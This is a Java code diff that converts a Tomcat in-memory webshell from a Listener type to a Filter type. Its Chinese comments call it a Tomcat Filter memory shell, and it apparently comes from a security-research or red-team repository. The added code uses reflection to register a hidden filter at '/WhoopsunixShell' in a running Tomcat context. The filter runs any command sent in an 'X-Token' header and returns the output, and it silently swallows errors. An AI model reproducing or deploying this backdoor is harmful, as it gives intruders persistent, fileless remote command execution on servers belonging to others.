@@ -1,7 +1,6 @@
 package com.demo.memshell;
 
-import javax.servlet.ServletRequestEvent;
-import javax.servlet.ServletRequestListener;
+import javax.servlet.*;
 import javax.servlet.http.HttpServletRequest;
 import java.io.InputStream;
 import java.io.PrintWriter;
@@ -10,11 +9,15 @@ import java.lang.reflect.Method;
 
 /**
  * @author Whoopsunix
- * ContextClassLoader 注入 Tomcat Listener 型内存马
+ * ContextClassLoader 注入 Tomcat Filter 型内存马
  * Tomcat 8 9
  */
-public class TLMSContextClass implements ServletRequestListener {
-    public TLMSContextClass() {
+public class TomcatFilterContextClassMS implements Filter {
+
+    final private static String NAME = "Whoopsunix";
+    final private static String pattern = "/WhoopsunixShell";
+
+    public TomcatFilterContextClassMS() {
 
     }
 
@@ -35,31 +38,67 @@ public class TLMSContextClass implements ServletRequestListener {
                 standardContext = (org.apache.catalina.core.StandardContext) getFieldValue(root, "context");
             }
 
-            TLMSContextClass listenerMemShell = new TLMSContextClass();
-            standardContext.addApplicationEventListener(listenerMemShell);
-        } catch (Exception ignored) {
-            ignored.printStackTrace();
+            org.apache.tomcat.util.descriptor.web.FilterDef filterDef = standardContext.findFilterDef(NAME);
+            if (filterDef == null) {
+                TomcatFilterContextClassMS filterMemShell = new TomcatFilterContextClassMS();
+//                // M1 ApplicationContext 方式注册
+//                // 修改 state 状态
+//                setFieldValue(standardContext, "state", org.apache.catalina.LifecycleState.STARTING_PREP);
+//                FilterRegistration.Dynamic registration = standardContext.getServletContext().addFilter(NAME, filterMemShell);
+//                registration.setInitParameter("encoding", "utf-8");
+//                registration.setAsyncSupported(false);
+//                // 已添加 filterMap
+//                registration.addMappingForUrlPatterns(null, false, pattern);
+//                setFieldValue(standardContext, "state", org.apache.catalina.LifecycleState.STARTED);
+//
+//                // 获取 filterDef，ApplicationContext.addFilter() 已调用
+//                filterDef = standardContext.findFilterDef(NAME);
+
+
+                // M2
+                // 添加 filterDef
+                filterDef = new org.apache.tomcat.util.descriptor.web.FilterDef();
+                filterDef.setFilterName(NAME);
+                filterDef.setFilterClass(filterMemShell.getClass().getName());
+                filterDef.setFilter(filterMemShell);
+                standardContext.addFilterDef(filterDef);
+
+                // 添加 filterMap
+                org.apache.tomcat.util.descriptor.web.FilterMap filterMap = new org.apache.tomcat.util.descriptor.web.FilterMap();
+                filterMap.setFilterName(NAME);
+                filterMap.addURLPattern(pattern);
+                filterMap.setDispatcher(DispatcherType.REQUEST.name());
+                standardContext.addFilterMapBefore(filterMap);
+
+                // 添加 filterConfig
+                java.util.Map filterConfigs = (java.util.Map) getFieldValue(standardContext, "filterConfigs");
+                java.lang.reflect.Constructor constructor = org.apache.catalina.core.ApplicationFilterConfig.class.getDeclaredConstructor(org.apache.catalina.Context.class, org.apache.tomcat.util.descriptor.web.FilterDef.class);
+                constructor.setAccessible(true);
+                org.apache.catalina.core.ApplicationFilterConfig filterConfig = (org.apache.catalina.core.ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
+                filterConfigs.put(NAME, filterConfig);
+            }
+        } catch (Exception e) {
+
         }
     }
 
 
     @Override
-    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
+    public void init(FilterConfig filterConfig) throws ServletException {
 
     }
 
     @Override
-    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
+    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) {
         try {
-            HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequestEvent.getServletRequest();
+            HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
             String header = httpServletRequest.getHeader("X-Token");
             if (header == null) {
                 return;
             }
             String result = exec(header);
-            org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) getFieldValue(httpServletRequest, "request");
-            PrintWriter printWriter = request.getResponse().getWriter();
-            printWriter.println("TLMSContextClass injected");
+            PrintWriter printWriter = servletResponse.getWriter();
+            printWriter.println("TomcatFilterContextClassMS injected");
             printWriter.println(result);
         } catch (Exception e) {
 
@@ -67,6 +106,10 @@ public class TLMSContextClass implements ServletRequestListener {
 
     }
 
+    @Override
+    public void destroy() {
+
+    }
 
     public static String exec(String str) {
         try {
@@ -117,4 +160,5 @@ public class TLMSContextClass implements ServletRequestListener {
         }
         return field;
     }
+
 }
